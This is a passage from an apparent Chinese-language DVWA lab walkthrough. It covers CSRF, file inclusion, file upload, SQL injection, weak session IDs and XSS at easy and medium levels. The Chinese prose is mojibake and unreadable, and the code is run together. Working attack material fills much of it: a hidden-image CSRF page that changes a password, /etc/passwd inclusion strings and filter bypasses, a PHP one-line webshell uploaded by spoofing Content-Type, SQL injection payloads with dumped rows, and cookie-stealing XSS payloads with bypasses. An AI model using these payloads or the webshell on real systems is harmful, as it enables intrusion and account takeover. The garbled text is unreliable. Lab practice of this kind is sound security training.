value=\"test\"&gt;&lt;br /&gt; &lt;br /&gt; &lt;input type=\"submit\" id=\"button\" name=\"Change\" value=\"Change\" /&gt; &lt;/form&gt;&lt;/body&gt; æ„é€ æ”»å‡»é¡µé¢ ç°å®æ”»å‡»åœºæ™¯ä¸‹ï¼Œè¿™ç§æ–¹æ³•éœ€è¦äº‹å…ˆåœ¨å…¬ç½‘ä¸Šä¼ ä¸€ä¸ªæ”»å‡»é¡µé¢ï¼Œè¯±éª—å—å®³è€…å»è®¿é—®ï¼ŒçœŸæ­£èƒ½å¤Ÿåœ¨å—å®³è€…ä¸çŸ¥æƒ…çš„æƒ…å†µä¸‹å®ŒæˆCSRFæ”»å‡»ã€‚è¿™é‡Œä¸ºäº†æ–¹ä¾¿æ¼”ç¤ºï¼Œå°±åœ¨æœ¬åœ°å†™ä¸€ä¸ªtest.htmlï¼Œä¸‹é¢æ˜¯å…·ä½“ä»£ç ã€‚ 123&lt;img src=&quot;http://192.168.31.84:81/vulnerabilities/csrf/?password_new=111&amp;password_conf=111&amp;Change=Change# border=&quot;0&quot; style=&quot;display:none;&quot;/&gt;&lt;h1&gt;404&lt;/h1&gt;&lt;h2&gt;file not found.&lt;/h2&gt; å½“å—å®³è€…è®¿é—®test.htmlæ—¶ï¼Œä¼šè¯¯è®¤ä¸ºæ˜¯è‡ªå·±ç‚¹å‡»çš„æ˜¯ä¸€ä¸ªå¤±æ•ˆçš„urlï¼Œä½†å®é™…ä¸Šå·²ç»é­å—äº†CSRFæ”»å‡»ï¼Œå¯†ç å·²ç»è¢«ä¿®æ”¹ä¸ºäº†hackã€‚ mediumæ¨¡å¼æ£€æŸ¥ HTTP_REFERERï¼ˆhttpåŒ…å¤´çš„Refererå‚æ•°çš„å€¼ï¼Œè¡¨ç¤ºæ¥æºåœ°å€ï¼‰ä¸­æ˜¯å¦åŒ…å«SERVER_NAMEï¼ˆhttpåŒ…å¤´çš„Hostå‚æ•°ï¼ŒåŠè¦è®¿é—®çš„ä¸»æœºåï¼Œï¼‰12// Checks to see where the request came from if( stripos( $_SERVER[ &apos;HTTP_REFERER&apos; ] ,$_SERVER[ &apos;SERVER_NAME&apos; ]) !== false ) &#123; æƒ³è¦é€šè¿‡éªŒè¯ï¼Œå°±å¿…é¡»ä¿è¯åœ¨httpè¯·æ±‚ä¸­Refererå­—æ®µä¸­å¿…é¡»åŒ…å«Hostæˆ‘ä»¬è¿™éœ€è¦æŠŠä¸Šé¢çš„æ”»å‡»é¡µé¢åå­—æ”¹æˆåŒ…å«hostå°±å¯ä»¥äº†ã€‚(æŠŠæ”»å‡»é¡µé¢æ”¾åœ¨æœåŠ¡å™¨ä¸Š) æ–‡ä»¶åŒ…å«easyæ¨¡å¼æŸäº›Webåº”ç”¨ç¨‹åºå…è®¸ç”¨æˆ·æŒ‡å®šç›´æ¥ç”¨äºæ–‡ä»¶æµçš„è¾“å…¥ï¼Œæˆ–å…è®¸ç”¨æˆ·å°†æ–‡ä»¶ä¸Šè½½åˆ°æœåŠ¡å™¨ã€‚ç¨åï¼ŒWebåº”ç”¨ç¨‹åºè®¿é—®Webåº”ç”¨ç¨‹åºä¸Šä¸‹æ–‡ä¸­çš„ç”¨æˆ·æä¾›çš„è¾“å…¥ã€‚é€šè¿‡è¿™æ ·åšï¼ŒWebåº”ç”¨ç¨‹åºå…è®¸æ½œåœ¨çš„æ¶æ„æ–‡ä»¶æ‰§è¡Œã€‚å¦‚æœé€‰æ‹©è¦åŒ…å«çš„æ–‡ä»¶åœ¨ç›®æ ‡è®¡ç®—æœºä¸Šæ˜¯æœ¬åœ°çš„ï¼Œåˆ™ç§°ä¸ºâ€œæœ¬åœ°æ–‡ä»¶åŒ…å«ï¼ˆLFIï¼‰ã€‚ä½†æ˜¯æ–‡ä»¶ä¹Ÿå¯ä»¥åŒ…å«åœ¨å…¶ä»–è®¡ç®—æœºä¸Šï¼Œç„¶åæ”»å‡»æ˜¯â€è¿œç¨‹æ–‡ä»¶åŒ…å«ï¼ˆRFIï¼‰ã€‚å½“RFIä¸æ˜¯ä¸€ç§é€‰æ‹©æ—¶ã€‚ä½¿ç”¨LFIçš„å¦ä¸€ä¸ªæ¼æ´ï¼ˆä¾‹å¦‚æ–‡ä»¶ä¸Šä¼ å’Œç›®å½•éå†ï¼‰é€šå¸¸å¯ä»¥è¾¾åˆ°åŒæ ·çš„æ•ˆæœã€‚æ³¨æ„ï¼Œæœ¯è¯­â€œæ–‡ä»¶åŒ…å«â€ä¸â€œä»»æ„æ–‡ä»¶è®¿é—®â€æˆ–â€œæ–‡ä»¶å…¬å¼€â€ä¸åŒã€‚åªä½¿ç”¨æ–‡ä»¶åŒ…å«æ¥é˜…è¯»â€™../hackable/flags/fi.phpâ€™ä¸­çš„æ‰€æœ‰äº”ä¸ªç€åå¼•å·ã€‚123456&lt;?php// The page we wish to display$file = $_GET[ &apos;page&apos; ];?&gt; æ–‡ä»¶åŒ…å«æ¼æ´çš„ä¸€èˆ¬ç‰¹å¾å¦‚ä¸‹ï¼š12345?page=a.php?home=a.html?file=content å‡ ç§ç»å…¸çš„æµ‹è¯•æ–¹æ³•ï¼š123456?file=../../../../../etc/passwdd?page=file:///etc/passwd?home=main.cgi?page=http://www.a.com/1.php=http://1.1.1.1/../../../../dir/file.txtï¼ˆé€šè¿‡å¤šä¸ª../å¯ä»¥è®©ç›®å½•å›åˆ°æ ¹ç›®å½•ä¸­ç„¶åå†è¿›å…¥ç›®æ ‡ç›®å½•ï¼‰ mediumæ¨¡å¼å¢åŠ å¯¹ç»å¯¹è·¯å¾„httpå’Œç›¸å¯¹è·¯å¾„çš„æ£€æŸ¥123// Input validation$file = str_replace( array( &quot;http://&quot;, &quot;https://&quot; ), &quot;&quot;, $file );$file = str_replace( array( &quot;../&quot;, &quot;..\\&quot;&quot; ), &quot;&quot;, $file ); ä½†ä¾ç„¶å¯ä»¥ä½¿ç”¨?page=file:///etc/passwdä»¥åŠé‡å¤å­—ç¬¦è¿‡æ»¤æ–¹æ³•,æ„é€ url æ„é€ urlä¸º httphttp:// â€“&gt; http æ„é€ urlä¸º httphttp://:// â€“&gt;http:// æ„é€ urlä¸º â€¦/./ â€“&gt; ../ æ–‡ä»¶ä¸Šä¼ easyæ¨¡å¼ ä¸Šä¼ çš„æ–‡ä»¶å¯¹Webåº”ç”¨ç¨‹åºæ„æˆé‡å¤§é£é™©ã€‚è®¸å¤šæ”»å‡»çš„ç¬¬ä¸€æ­¥æ˜¯å°†ä¸€äº›ä»£ç æä¾›ç»™ç³»ç»Ÿè¿›è¡Œæ”»å‡»ã€‚ç„¶åæ”»å‡»è€…åªéœ€è¦æ‰¾åˆ°ä¸€ç§æ–¹æ³•æ¥æ‰§è¡Œä»£ç ã€‚ä½¿ç”¨æ–‡ä»¶ä¸Šä¼ æœ‰åŠ©äºæ”»å‡»è€…å®Œæˆç¬¬ä¸€æ­¥ã€‚ä¸å—é™åˆ¶çš„æ–‡ä»¶ä¸Šè½½çš„åæœå¯èƒ½ä¼šæœ‰æ‰€ä¸åŒï¼ŒåŒ…æ‹¬å®Œæ•´çš„ç³»ç»Ÿæ¥ç®¡ï¼Œè¿‡è½½çš„æ–‡ä»¶ç³»ç»Ÿï¼Œå‘åç«¯ç³»ç»Ÿè½¬å‘æ”»å‡»ä»¥åŠç®€å•çš„æ±¡æŸã€‚è¿™å–å†³äºåº”ç”¨ç¨‹åºå¯¹ä¸Šä¼ æ–‡ä»¶çš„ä½œç”¨ï¼ŒåŒ…æ‹¬å­˜å‚¨ä½ç½®ã€‚ç”±äºæ­¤æ–‡ä»¶ä¸Šè½½æ¼æ´ï¼Œè¯·åœ¨ç›®æ ‡ç³»ç»Ÿä¸Šæ‰§è¡Œæ‚¨é€‰æ‹©çš„ä»»ä½•PHPå‡½æ•°ï¼ˆä¾‹å¦‚phpinfoï¼ˆï¼‰æˆ–systemï¼ˆï¼‰ï¼‰ã€‚ ä¸€å¥è¯æœ¨é©¬1.phpæ–‡ä»¶ï¼š123&lt;?phpecho shell_exec($_GET[&apos;cmd&apos;]);?&gt; 12345678910111213141516171819&lt;?phpif( isset( $_POST[ 'Upload' ] ) ) &#123; // Where are we going to be writing to? $target_path = DVWA_WEB_PAGE_TO_ROOT . \"hackable/uploads/\"; $target_path .= basename( $_FILES[ 'uploaded' ][ 'name' ] ); // Can we move the file to the upload folder? if( !move_uploaded_file( $_FILES[ 'uploaded' ][ 'tmp_name' ], $target_path ) ) &#123; // No echo '&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;'; &#125; else &#123; // Yes! echo \"&lt;pre&gt;&#123;$target_path&#125; succesfully uploaded!&lt;/pre&gt;\"; &#125;&#125;?&gt; mediumæ¨¡å¼å¢åŠ äº†å¯¹æ–‡ä»¶ç±»å‹å’Œå¤§å°çš„è¿‡æ»¤ï¼Œåªå…è®¸å›¾ç‰‡ä¸Šä¼ 12345678// File information$uploaded_name = $_FILES[ &apos;uploaded&apos; ][ &apos;name&apos; ];$uploaded_type = $_FILES[ &apos;uploaded&apos; ][ &apos;type&apos; ];$uploaded_size = $_FILES[ &apos;uploaded&apos; ][ &apos;size&apos; ];// Is it an image?if( ( $uploaded_type == &quot;image/jpeg&quot; || $uploaded_type == &quot;image/png&quot; ) &amp;&amp; ( $uploaded_size &lt; 100000 ) ) &#123; ç”¨burpsuiteæ‹¦æˆªä¿®æ”¹Content-Type: application/octet-streamä¸ºContent-Type: image/jpegã€‚æˆåŠŸä¸Šä¼ ï¼šhttp://192.168.31.84:81/hackable/uploads/1.php?cmd=ls SQLæ³¨å…¥easyæ¨¡å¼ SQLæ³¨å…¥æ”»å‡»åŒ…æ‹¬é€šè¿‡ä»å®¢æˆ·ç«¯åˆ°åº”ç”¨ç¨‹åºçš„è¾“å…¥æ•°æ®æ’å…¥æˆ–â€œæ³¨å…¥â€SQLæŸ¥è¯¢ã€‚æˆåŠŸçš„SQLæ³¨å…¥æ”»å‡»å¯ä»¥ä»æ•°æ®åº“ä¸­è¯»å–æ•æ„Ÿæ•°æ®ï¼Œä¿®æ”¹æ•°æ®åº“æ•°æ®ï¼ˆæ’å…¥/æ›´æ–°/åˆ é™¤ï¼‰ï¼Œå¯¹æ•°æ®åº“æ‰§è¡Œç®¡ç†æ“ä½œï¼ˆå¦‚å…³é—­DBMSï¼‰ï¼Œæ¢å¤DBMSæ–‡ä»¶ä¸­å­˜åœ¨çš„ç»™å®šæ–‡ä»¶çš„å†…å®¹systemï¼ˆload_fileï¼‰ï¼Œåœ¨æŸäº›æƒ…å†µä¸‹å‘æ“ä½œç³»ç»Ÿå‘å‡ºå‘½ä»¤ã€‚SQLæ³¨å…¥æ”»å‡»æ˜¯ä¸€ç§æ³¨å…¥æ”»å‡»ï¼Œå…¶ä¸­SQLå‘½ä»¤è¢«æ³¨å…¥åˆ°æ•°æ®å¹³é¢è¾“å…¥ä¸­ï¼Œä»¥ä¾¿å®ç°é¢„å®šä¹‰çš„SQLå‘½ä»¤ã€‚è¿™ç§æ”»å‡»ä¹Ÿå¯ç§°ä¸ºâ€œSQLiâ€ã€‚ 123456789101112131415161718192021222324&lt;?phpif( isset( $_REQUEST[ &apos;Submit&apos; ] ) ) &#123; // Get input $id = $_REQUEST[ &apos;id&apos; ]; // Check database $query = &quot;SELECT first_name, last_name FROM users WHERE user_id = &apos;$id&apos;;&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query ) or die( &apos;&lt;pre&gt;&apos; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &apos;&lt;/pre&gt;&apos; ); // Get results while( $row = mysqli_fetch_assoc( $result ) ) &#123; // Get values $first = $row[&quot;first_name&quot;]; $last = $row[&quot;last_name&quot;]; // Feedback for end user echo &quot;&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;&quot;; &#125; mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]);&#125;?&gt; åœ¨åšæŸ¥è¯¢æ“ä½œæ—¶ï¼Œæœªå¯¹$idåšä»»ä½•é™åˆ¶ï¼Œç›´æ¥ä¼ å…¥äº†sqlè¯­å¥ï¼Œé€ æˆå­—ç¬¦å‹æ³¨å…¥ åŸSELECTè¯­å¥SELECT first_name, last_name FROM users WHERE user_id = &#39;$id&#39;;ä¸­çš„$idå¯ä»¥ä»»æ„è¾“å…¥ã€‚å½“è¾“å…¥$id=123â€™ OR 1=1#æ—¶ï¼ŒSELECTè¯­å¥å˜æˆäº†SELECT first_name, last_name FROM users WHERE user_id = &#39;123&#39; OR 1=1#&#39;;æ­¤æ—¶æœ€åä¸€ä¸ªå¼•å·è¢«#æ³¨é‡Šï¼ŒåŒæ—¶1=1æ°¸è¿œè¿”å›TRUEï¼Œè¿™å°±å¯¼è‡´æ‰€æœ‰ç”¨æˆ·çš„å§“åæ³„éœ²ã€‚123456789101112131415ID: 123&apos; OR 1=1#First name: adminSurname: adminID: 123&apos; OR 1=1#First name: GordonSurname: BrownID: 123&apos; OR 1=1#First name: HackSurname: MeID: 123&apos; OR 1=1#First name: PabloSurname: PicassoID: 123&apos; OR 1=1#First name: BobSurname: Smith é‚£å¦‚æœæƒ³è¦å¾—åˆ°å¯†ç è¯¥æ€ä¹ˆåšï¼ŒUNION æ“ä½œç¬¦ç”¨äºåˆå¹¶ä¸¤ä¸ªæˆ–å¤šä¸ª SELECT è¯­å¥çš„ç»“æœé›†ï¼Œæˆ‘ä»¬å¯ä»¥è¿™æ ·æ„é€ id$id=123&#39; or 1=1# union SELECT first_name,password FROMä½†è²Œä¼¼è¡¨é‡Œæ²¡æœ‰password12345678910111213141516usersID: 123&apos; or 1=1# union SELECT first_name,password FROM usersFirst name: adminSurname: adminID: 123&apos; or 1=1# union SELECT first_name,password FROM usersFirst name: GordonSurname: BrownID: 123&apos; or 1=1# union SELECT first_name,password FROM usersFirst name: HackSurname: MeID: 123&apos; or 1=1# union SELECT first_name,password FROM usersFirst name: PabloSurname: PicassoID: 123&apos; or 1=1# union SELECT first_name,password FROM usersFirst name: BobSurname: Smith mediumæ¨¡å¼å‰ç«¯åªèƒ½é€‰æ‹©ï¼Œå‰æºç è¿‡æ»¤äº†å­—ç¬¦$id = mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $id);å…¶ä¸­å—å½±å“çš„å­—ç¬¦å¦‚ä¸‹ï¼š1234567\\x00\\n\\r\\&apos;&quot;\\x1a ä½†ç”±äºå…¶ä¸ºå­—ç¬¦å‹æ³¨å…¥ï¼Œå› æ­¤é˜²å¾¡æ‰‹æ®µå½¢åŒè™šè®¾æ„é€ id=1 or 1=1#å³å¾—åˆ°æ‰€æœ‰ç”¨æˆ·ä¿¡æ¯ SQLç›²æ³¨ ç›²æ³¨ï¼Œä¸ä¸€èˆ¬æ³¨å…¥çš„åŒºåˆ«åœ¨äºï¼Œä¸€èˆ¬çš„æ³¨å…¥æ”»å‡»è€…å¯ä»¥ç›´æ¥ä»é¡µé¢ä¸Šçœ‹åˆ°æ³¨å…¥è¯­å¥çš„æ‰§è¡Œç»“æœï¼Œè€Œç›²æ³¨æ—¶æ”»å‡»è€…é€šå¸¸æ˜¯æ— æ³•ä»æ˜¾ç¤ºé¡µé¢ä¸Šè·å–æ‰§è¡Œç»“æœï¼Œç”šè‡³è¿æ³¨å…¥è¯­å¥æ˜¯å¦æ‰§è¡Œéƒ½æ— ä»å¾—çŸ¥ï¼Œå› æ­¤ç›²æ³¨çš„éš¾åº¦è¦æ¯”ä¸€èˆ¬æ³¨å…¥é«˜ã€‚ç›®å‰ç½‘ç»œä¸Šç°å­˜çš„SQLæ³¨å…¥æ¼æ´å¤§å¤šæ˜¯SQLç›²æ³¨ã€‚1.åˆ¤æ–­æ˜¯å¦å­˜åœ¨æ³¨å…¥ï¼Œæ³¨å…¥æ˜¯å­—ç¬¦å‹è¿˜æ˜¯æ•°å­—å‹2.çŒœè§£å½“å‰æ•°æ®åº“å3.çŒœè§£æ•°æ®åº“ä¸­çš„è¡¨å4.çŒœè§£è¡¨ä¸­çš„å­—æ®µå5.çŒœè§£æ•°æ® 12345678910111213141516171819202122232425262728&lt;?phpif( isset( $_GET[ 'Submit' ] ) ) &#123; // Get input $id = $_GET[ 'id' ]; // Check database $getid = \"SELECT first_name, last_name FROM users WHERE user_id = '$id';\"; $result = mysqli_query($GLOBALS[\"___mysqli_ston\"], $getid ); // Removed 'or die' to suppress mysql errors // Get results $num = @mysqli_num_rows( $result ); // The '@' character suppresses errors if( $num &gt; 0 ) &#123; // Feedback for end user echo '&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;'; &#125; else &#123; // User wasn't found, so the page wasn't! header( $_SERVER[ 'SERVER_PROTOCOL' ] . ' 404 Not Found' ); // Feedback for end user echo '&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;'; &#125; ((is_null($___mysqli_res = mysqli_close($GLOBALS[\"___mysqli_ston\"]))) ? false : $___mysqli_res);&#125;?&gt; æŸ¥çœ‹æºç å‘ç°è¿˜æ˜¯æ²¡æœ‰å¯¹idåšè¿‡æ»¤ï¼Œä½†æ˜¯å®ƒä¸ä¼šè¿”å›é”™è¯¯ä¿¡æ¯ï¼Œåªä¼šå‘Šè¯‰ä½ User ID exists in the database.ä»¥åŠUser ID is MISSING from the database. ç›²æ³¨åˆ†ä¸ºåŸºäºå¸ƒå°”çš„ç›²æ³¨ã€åŸºäºæ—¶é—´çš„ç›²æ³¨ä»¥åŠåŸºäºæŠ¥é”™çš„ç›²æ³¨ã€‚å¦‚æœæ‰‹å·¥ç›²æ³¨çš„è¯ï¼Œéœ€è¦å¯¹sqlè¯­æ³•ç›¸å½“ç†Ÿæ‚‰ã€‚ç±»ä¼¼ï¼šhttps://www.freebuf.com/articles/web/120985.htmlå¦‚æœè‡ªåŠ¨ç›²æ³¨çš„è¯ï¼Œå¯ä»¥ä½¿ç”¨sqlmapæ¥å®Œæˆï¼Œç±»ä¼¼ï¼šhttps://www.jianshu.com/p/ec2ca79e74b2 å¼±session-ideasyæ¨¡å¼session-IDé€šå¸¸æ˜¯åœ¨ç™»å½•åä½œä¸ºç‰¹å®šç”¨æˆ·è®¿é—®ç«™ç‚¹æ‰€éœ€çš„å”¯ä¸€å†…å®¹ï¼Œå¦‚æœèƒ½å¤Ÿè®¡ç®—æˆ–è½»æ˜“çŒœåˆ°è¯¥ä¼šè¯IDï¼Œåˆ™æ”»å‡»è€…å°†æœ‰ä¸€ç§ç®€å•çš„æ–¹æ³•æ¥è·å–è®¿é—®æƒé™ã€‚æ— éœ€çŸ¥é“è´¦æˆ·å¯†ç æˆ–æŸ¥æ‰¾å…¶ä»–æ¼æ´ï¼Œå¦‚è·¨ç«™ç‚¹è„šæœ¬ã€‚ æ ¹æ®æºç å¯ä»¥çœ‹å‡ºæ¥sessionæ¯æ¬¡åŠ 112345678910111213&lt;?php$html = \"\";if ($_SERVER['REQUEST_METHOD'] == \"POST\") &#123; if (!isset ($_SESSION['last_session_id'])) &#123; $_SESSION['last_session_id'] = 0; &#125; $_SESSION['last_session_id']++; $cookie_value = $_SESSION['last_session_id']; setcookie(\"dvwaSession\", $cookie_value);&#125;?&gt; æŒ‰f12çœ‹application-cookiesä¹Ÿèƒ½å‘ç°è¿™ä¸ªè§„å¾‹ã€‚ç„¶åä½¿ç”¨hackbarè¿™ä¸ªæ‰©å±•ç¨‹åºæ”»å‡»ã€‚ mediumæ¨¡å¼ä»æºç ä¸­å¯ä»¥çœ‹åˆ°dvwaSessionå°±æ˜¯æ—¶é—´æˆ³123456789&lt;?php$html = &quot;&quot;;if ($_SERVER[&apos;REQUEST_METHOD&apos;] == &quot;POST&quot;) &#123; $cookie_value = time(); setcookie(&quot;dvwaSession&quot;, $cookie_value);&#125;?&gt; åŸºäºDOMçš„XSSeasyæ¨¡å¼ â€œè·¨ç«™ç‚¹è„šæœ¬ï¼ˆXSSï¼‰â€æ”»å‡»æ˜¯ä¸€ç§æ³¨å…¥é—®é¢˜ï¼Œå…¶ä¸­æ¶æ„è„šæœ¬è¢«æ³¨å…¥åˆ°å…¶ä»–è‰¯æ€§å’Œå¯ä¿¡èµ–çš„ç½‘ç«™ä¸­ã€‚å½“æ”»å‡»è€…ä½¿ç”¨Webåº”ç”¨ç¨‹åºå°†æ¶æ„ä»£ç ï¼ˆé€šå¸¸ä»¥æµè§ˆå™¨ç«¯è„šæœ¬çš„å½¢å¼ï¼‰å‘é€ç»™ä¸åŒçš„æœ€ç»ˆç”¨æˆ·æ—¶ï¼Œå°±ä¼šå‘ç”ŸXSSæ”»å‡»ã€‚å…è®¸è¿™äº›æ”»å‡»æˆåŠŸçš„ç¼ºé™·éå¸¸æ™®éï¼Œå¹¶ä¸”å‘ç”Ÿåœ¨ä½¿ç”¨è¾“å‡ºä¸­çš„ç”¨æˆ·è¾“å…¥çš„Webåº”ç”¨ç¨‹åºçš„ä»»ä½•åœ°æ–¹ï¼Œè€Œä¸éªŒè¯æˆ–ç¼–ç å®ƒã€‚ æ”»å‡»è€…å¯ä»¥ä½¿ç”¨XSSå°†æ¶æ„è„šæœ¬å‘é€ç»™æ¯«æ— æˆ’å¿ƒçš„ç”¨æˆ·ã€‚æœ€ç»ˆç”¨æˆ·çš„æµè§ˆå™¨æ— æ³•çŸ¥é“è¯¥è„šæœ¬ä¸åº”è¯¥è¢«ä¿¡ä»»ï¼Œå¹¶å°†æ‰§è¡ŒJavaScriptã€‚å› ä¸ºå®ƒè®¤ä¸ºè„šæœ¬æ¥è‡ªå¯é æ¥æºï¼Œæ‰€ä»¥æ¶æ„è„šæœ¬å¯ä»¥è®¿é—®æ‚¨çš„æµè§ˆå™¨ä¿ç•™å¹¶ä¸è¯¥ç«™ç‚¹ä¸€èµ·ä½¿ç”¨çš„ä»»ä½•cookieï¼Œä¼šè¯ä»¤ç‰Œæˆ–å…¶ä»–æ•æ„Ÿä¿¡æ¯ã€‚è¿™äº›è„šæœ¬ç”šè‡³å¯ä»¥é‡å†™HTMLé¡µé¢çš„å†…å®¹ã€‚ åŸºäºDOMçš„XSSæ˜¯ä¸€ä¸ªç‰¹æ®Šæƒ…å†µï¼Œåæ˜ äº†JavaScriptéšè—åœ¨URLä¸­å¹¶åœ¨å‘ˆç°æ—¶ç”±é¡µé¢ä¸­çš„JavaScriptæ‹‰å‡ºè€Œä¸æ˜¯åœ¨æœåŠ¡æ—¶åµŒå…¥é¡µé¢ä¸­ã€‚è¿™å¯èƒ½ä½¿å…¶æ¯”å…¶ä»–æ”»å‡»æ›´éšè”½ï¼Œå¹¶ä¸”æ­£åœ¨é˜…è¯»é¡µé¢ä¸»ä½“çš„WAFæˆ–å…¶ä»–ä¿æŠ¤æªæ–½çœ‹ä¸åˆ°ä»»ä½•æ¶æ„å†…å®¹ã€‚ æŸ¥çœ‹é¡µé¢æºä»£ç 12345678910111213&lt;script&gt; if (document.location.href.indexOf(&quot;default=&quot;) &gt;= 0) &#123; var lang = document.location.href.substring(document.location.href.indexOf(&quot;default=&quot;)+8); document.write(&quot;&lt;option value=&apos;&quot; + lang + &quot;&apos;&gt;&quot; + decodeURI(lang) + &quot;&lt;/option&gt;&quot;); document.write(&quot;&lt;option value=&apos;&apos; disabled=&apos;disabled&apos;&gt;----&lt;/option&gt;&quot;); &#125; document.write(&quot;&lt;option value=&apos;English&apos;&gt;English&lt;/option&gt;&quot;); document.write(&quot;&lt;option value=&apos;French&apos;&gt;French&lt;/option&gt;&quot;); document.write(&quot;&lt;option value=&apos;Spanish&apos;&gt;Spanish&lt;/option&gt;&quot;); document.write(&quot;&lt;option value=&apos;German&apos;&gt;German&lt;/option&gt;&quot;);&lt;/script&gt; indexOf() æ–¹æ³•å¯è¿”å›æŸä¸ªæŒ‡å®šçš„å­—ç¬¦ä¸²å€¼åœ¨å­—ç¬¦ä¸²ä¸­é¦–æ¬¡å‡ºç°çš„ä½ç½®ã€‚ substring() æ–¹æ³•ç”¨äºæå–å­—ç¬¦ä¸²ä¸­ä»‹äºä¸¤ä¸ªæŒ‡å®šä¸‹æ ‡ä¹‹é—´çš„å­—ç¬¦ã€‚ decodeURI() å‡½æ•°å¯å¯¹ encodeURI() å‡½æ•°ç¼–ç è¿‡çš„ URI è¿›è¡Œè§£ç  æ‰€ä»¥langè¢«èµ‹å€¼ä¸ºâ€default=â€ä¹‹åçš„å­—ä¸²ï¼Œå¦‚æœæ’å…¥jsä»£ç ï¼Œæ’å…¥çš„ javascript ä»£ç å¯ä»¥åœ¨ decodeURL(lang) è¢«æ‰§è¡Œ http://192.168.31.84:81/vulnerabilities/xss_d/?default=English&lt;script&gt;alert(document.cookie)&lt;/script&gt;è¿™ä¸ªuriè¢«ç”¨æˆ·ç‚¹å‡»ä¹‹åä¼šè¢«å¼¹çª—ï¼Œä½†æ˜¯åœ¨chromeæµ‹è¯•äº†å¾ˆå¤šæ¬¡éƒ½ä¸è¡Œï¼Œfirefoxå°±å¯ä»¥ mediumæ¨¡å¼ç›¸å¯¹äºeasyæ¨¡å¼å¢åŠ äº†å¯¹scriptçš„è¿‡æ»¤12345# Do not allow script tagsif (stripos ($default, &quot;&lt;script&quot;) !== false) &#123; header (&quot;location: ?default=English&quot;); exit;&#125; ç»•è¿‡æœ‰ä¸¤ç§æ–¹å¼ æ–¹å¼1urlä¸­æœ‰ä¸€ä¸ªå­—ç¬¦ä¸º#ï¼Œè¯¥å­—ç¬¦åçš„æ•°æ®ä¸ä¼šå‘é€åˆ°æœåŠ¡å™¨ç«¯ï¼Œä»è€Œç»•è¿‡æœåŠ¡ç«¯è¿‡æ»¤http://192.168.31.84:81/vulnerabilities/xss_d/?default=English#&lt;script&gt;alert(document.cookie)&lt;/script&gt; æ–¹æ³•2æˆ–è€…å°±æ˜¯ç”¨imgæ ‡ç­¾æˆ–å…¶ä»–æ ‡ç­¾çš„ç‰¹æ€§å»æ‰§è¡Œjsä»£ç ï¼Œæ¯”å¦‚imgæ ‡ç­¾çš„onerroräº‹ä»¶ï¼Œæ„é€ è¿æ¥(é€šè¿‡åŠ è½½ä¸€ä¸ªä¸å­˜åœ¨çš„å›¾ç‰‡å‡ºé”™å‡ºå‘javascript onerroräº‹ä»¶,ç»§ç»­å¼¹æ¡†ï¼Œè¯æ˜å‡ºæ¥æœ‰xss)123456789101112131415161718# åå°„å‹xss## easyæ¨¡å¼&gt; åå°„å‹ï¼ˆéæŒä¹…ï¼‰ï¼šä¸»è¦ç”¨äºå°†æ¶æ„ä»£ç é™„åŠ åˆ°URLåœ°å€çš„å‚æ•°ä¸­ï¼Œå¸¸ç”¨äºçªƒå–å®¢æˆ·ç«¯cookieä¿¡æ¯å’Œé’“é±¼æ¬ºéª—ã€‚æŸ¥çœ‹æºç ï¼ŒæœåŠ¡å™¨ç›´æ¥æŠŠå®¢æˆ·ç«¯çš„è¾“å…¥è¿”å›å›æ¥æ˜¾ç¤º```php&lt;?phpheader (&quot;X-XSS-Protection: 0&quot;);// Is there any input?if( array_key_exists( &quot;name&quot;, $_GET ) &amp;&amp; $_GET[ &apos;name&apos; ] != NULL ) &#123; // Feedback for end user echo &apos;&lt;pre&gt;Hello &apos; . $_GET[ &apos;name&apos; ] . &apos;&lt;/pre&gt;&apos;;&#125;?&gt; http://192.168.31.84:81/vulnerabilities/xss_r/?name=%3Cscript%3Ealert(%27xss%27)%3C/script%3E mediumæ¨¡å¼æºç é‡Œæ£€æŸ¥äº†scriptæ ‡ç­¾12// Get input $name = str_replace( &apos;&lt;script&gt;&apos;, &apos;&apos;, $_GET[ &apos;name&apos; ] ); str_replaceè¿™ä¸ªå‡½æ•°æ˜¯ä¸åŒºåˆ†å¤§å°å†™çš„ï¼Œè€Œä¸”åªæ›¿æ¢ä¸€æ¬¡æ”¹æˆå¤§å†™å°±å¯ä»¥äº†&lt;SCRIPT&gt;alert(&#39;xss&#39;)&lt;/script&gt;æˆ–è€…åµŒå¥—&lt;scr&lt;script&gt;ipt&gt;alert(&#39;xss&#39;)&lt;/script&gt; ä½†å¯¹nameå®¡æŸ¥æ²¡æœ‰è¿™ä¹ˆä¸¥æ ¼ï¼ŒåŒæ ·å¯ä»¥é‡‡ç”¨åµŒå¥—æˆ–å¤§å°å†™çš„æ–¹æ³•ï¼š12&lt;scr&lt;script&gt;ipt&gt;alert(&apos;fuck&apos;)&lt;/script&gt;&lt;SCRIPT&gt;alert(&apos;fuck&apos;)&lt;/script&gt; å­˜å‚¨å‹xsseasyæ¨¡å¼ â€œè·¨ç«™ç‚¹è„šæœ¬ï¼ˆXSSï¼‰â€æ”»å‡»æ˜¯ä¸€ç§æ³¨å…¥é—®é¢˜ï¼Œå…¶ä¸­æ¶æ„è„šæœ¬è¢«æ³¨å…¥åˆ°å…¶ä»–è‰¯æ€§å’Œå¯ä¿¡èµ–çš„ç½‘ç«™ä¸­ã€‚å½“æ”»å‡»è€…ä½¿ç”¨Webåº”ç”¨ç¨‹åºå°†æ¶æ„ä»£ç 